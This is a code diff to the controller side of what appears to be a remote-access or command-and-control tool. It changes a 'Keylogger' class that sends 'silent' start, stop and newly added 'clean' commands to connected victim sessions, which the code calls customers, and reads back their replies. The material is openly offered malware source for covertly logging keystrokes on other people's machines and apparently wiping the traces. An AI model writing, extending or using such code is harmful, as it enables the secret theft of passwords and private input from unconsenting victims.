@@ -30,6 +30,8 @@ class Keylogger:
 
 --stop : 
 
+--clean : 
+
 --dump : 
 
 -b or --back : Back to menu.
@@ -75,10 +77,13 @@ class Keylogger:
             printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")
 
     
-    def sendStartorStop(self, data):
+    def sendMod(self, data):
         if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], data)):
             #CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
             printColor("successfully", "[+] The mod has been sent.")
+            print("go to recvmod")
+            CheckConn().recvmod(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
+
         else:
             printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")
 
@@ -109,10 +114,13 @@ class Keylogger:
                 self.directTcp()
 
             elif terminal == "--start":
-                self.sendStartorStop("MOD_KEYLOGGER:start_silencious")
+                self.sendMod("MOD_KEYLOGGER:start_silencious")
             
             elif terminal == "--stop":
-                self.sendStartorStop("MOD_KEYLOGGER:stop_silencious")
+                self.sendMod("MOD_KEYLOGGER:stop_silencious")
+
+            elif terminal == "--clean":
+                self.sendMod("MOD_KEYLOGGER:clean_silencious")
 
             elif terminal == "--dump":
                 self.dumpAllData()
